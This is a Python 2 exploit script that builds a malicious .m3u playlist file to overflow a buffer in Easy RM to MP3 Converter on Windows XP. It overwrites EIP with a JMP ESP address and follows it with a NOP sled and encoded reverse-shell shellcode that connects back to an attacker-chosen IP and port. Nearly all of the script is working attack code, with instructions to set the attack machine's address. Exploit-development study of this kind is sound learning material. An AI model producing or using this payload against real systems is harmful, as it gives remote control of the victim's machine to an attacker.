## This is a reverse shell TCP python code for exploiting WinXP's Easy RM to MP3 by uploading a malicious .m3U file.
## Using this code, you will be able to generate a .m3U file. Kindly remember to change the Local IP & Port as per your  
## attack machine's configuration. Written by CiiWairoto

import sys

if len(sys.argv) < 3:
        print '[!] You need to provide the IP  & Port'
        print '\t[-] E.g. %s 192.168.56.101 2020' % sys.argv[0]
        sys.exit()
else:
        target= sys.argv[1]
        port= int(sys.argv[2])



## File header
header= 'EXTM3U\r\n'
line1= '#EXTINF:210,Artist Name - Track Title \r\n'
url_part1= 'http://'
url_part2= '.example.com/test.m3u'

## Buffer 
junk1= '\x41' * 35073 ## Our start of the  EIP
eip = '\xE1\xBC\x08\x76' ## Our JMP esp
nops= '\x90' *16 ## This is for padding the payload
buf =  ""
buf += "\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x7d\xbe\x87\xd0\x83\xee\xfc\xe2\xf4\x81\x56"
buf += "\x05\xd0\x7d\xbe\xe7\x59\x98\x8f\x47\xb4\xf6\xee\xb7"
buf += "\x5b\x2f\xb2\x0c\x82\x69\x35\xf5\xf8\x72\x09\xcd\xf6"
buf += "\x4c\x41\x2b\xec\x1c\xc2\x85\xfc\x5d\x7f\x48\xdd\x7c"
buf += "\x79\x65\x22\x2f\xe9\x0c\x82\x6d\x35\xcd\xec\xf6\xf2"
buf += "\x96\xa8\x9e\xf6\x86\x01\x2c\x35\xde\xf0\x7c\x6d\x0c"
buf += "\x99\x65\x5d\xbd\x99\xf6\x8a\x0c\xd1\xab\x8f\x78\x7c"
buf += "\xbc\x71\x8a\xd1\xba\x86\x67\xa5\x8b\xbd\xfa\x28\x46"
buf += "\xc3\xa3\xa5\x99\xe6\x0c\x88\x59\xbf\x54\xb6\xf6\xb2"
buf += "\xcc\x5b\x25\xa2\x86\x03\xf6\xba\x0c\xd1\xad\x37\xc3"
buf += "\xf4\x59\xe5\xdc\xb1\x24\xe4\xd6\x2f\x9d\xe1\xd8\x8a"
buf += "\xf6\xac\x6c\x5d\x20\xd6\xb4\xe2\x7d\xbe\xef\xa7\x0e"
buf += "\x8c\xd8\x84\x15\xf2\xf0\xf6\x7a\x41\x52\x68\xed\xbf"
buf += "\x87\xd0\x54\x7a\xd3\x80\x15\x97\x07\xbb\x7d\x41\x52"
buf += "\x80\x2d\xee\xd7\x90\x2d\xfe\xd7\xb8\x97\xb1\x58\x30"
buf += "\x82\x6b\x10\xba\x78\xd6\x47\x78\x45\x76\xef\xd2\x7d"
buf += "\xb9\x63\x59\x9b\xd4\x97\x86\x2a\xd6\x1e\x75\x09\xdf"
buf += "\x78\x05\xf8\x7e\xf3\xdc\x82\xf0\x8f\xa5\x91\xd6\x77"
buf += "\x65\xdf\xe8\x78\x05\x15\xdd\xea\xb4\x7d\x37\x64\x87"
buf += "\x2a\xe9\xb6\x26\x17\xac\xde\x86\x9f\x43\xe1\x17\x39"
buf += "\x9a\xbb\xd1\x7c\x33\xc3\xf4\x6d\x78\x87\x94\x29\xee"
buf += "\xd1\x86\x2b\xf8\xd1\x9e\x2b\xe8\xd4\x86\x15\xc7\x4b"
buf += "\xef\xfb\x41\x52\x59\x9d\xf0\xd1\x96\x82\x8e\xef\xd8"
buf += "\xfa\xa3\xe7\x2f\xa8\x05\x77\x65\xdf\xe8\xef\x76\xe8"
buf += "\x03\x1a\x2f\xa8\x82\x81\xac\x77\x3e\x7c\x30\x08\xbb"
buf += "\x3c\x97\x6e\xcc\xe8\xba\x7d\xed\x78\x05"



junk2= '\x43'* 800

## Payload
payload= junk1 + eip + nops + buf + junk2

## Our new .m3U file
exploit = open('m3uc_exploit.m3u', 'w')
exploit.write(header+line1+url_part1+payload+url_part2)
